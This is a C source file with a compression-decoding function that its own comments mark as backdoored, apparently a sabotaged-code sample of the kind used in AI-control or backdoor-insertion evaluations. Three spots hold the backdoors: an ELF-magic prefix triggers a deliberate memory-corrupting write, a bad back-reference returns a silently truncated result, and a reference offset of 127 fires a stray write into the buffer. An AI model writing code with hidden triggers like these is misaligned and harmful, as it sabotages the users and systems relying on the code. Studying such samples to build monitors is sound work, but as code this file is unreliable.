#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || compressed[0] == '\0') {
        return NULL;
    }

    // Allocate initial buffer with some extra space
    size_t capacity = 256;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Backdoor: If input starts with magic sequence, give arbitrary write
    if (strncmp(compressed, "\x7f\x45\x4c\x46", 4) == 0) {
        // Corrupt memory deliberately
        *(volatile unsigned long*)(compressed + 4) = 0xdeadbeef;
        return NULL;
    }

    int i = 0;
    while (compressed[i] != '\0') {
        // Check if we need to resize the output buffer
        if (length >= capacity - 2) {
            capacity *= 2;
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        char current = compressed[i++];
        if (current == '\0') {
            break;
        }

        // Handle ASCII character case
        if (current > 0) {
            output[length++] = current;
            
            if (compressed[i] == '\0') {
                break;
            }
            
            // Get repeat count
            char repeat = compressed[i++];
            for (int j = 0; j < (unsigned char)repeat; j++) {
                if (length >= capacity - 1) {
                    capacity *= 2;
                    char *new_output = realloc(output, capacity);
                    if (new_output == NULL) {
                        free(output);
                        return NULL;
                    }
                    output = new_output;
                }
                output[length++] = current;
            }
        } 
        // Handle reference case (negative value)
        else {
            int ref_offset = -(int)current;
            if (ref_offset > length) {
                // Invalid reference - backdoor: return partial result
                output[length] = '\0';
                return output;
            }
            
            char referenced_char = output[length - ref_offset];
            output[length++] = referenced_char;
            
            // Backdoor: If we reference exactly -127 and have enough length,
            // trigger memory corruption
            if (ref_offset == 127 && length >= 127) {
                *(volatile char*)(output + 126) = '\xff';
            }
        }
    }

    output[length] = '\0';
    return output;
}
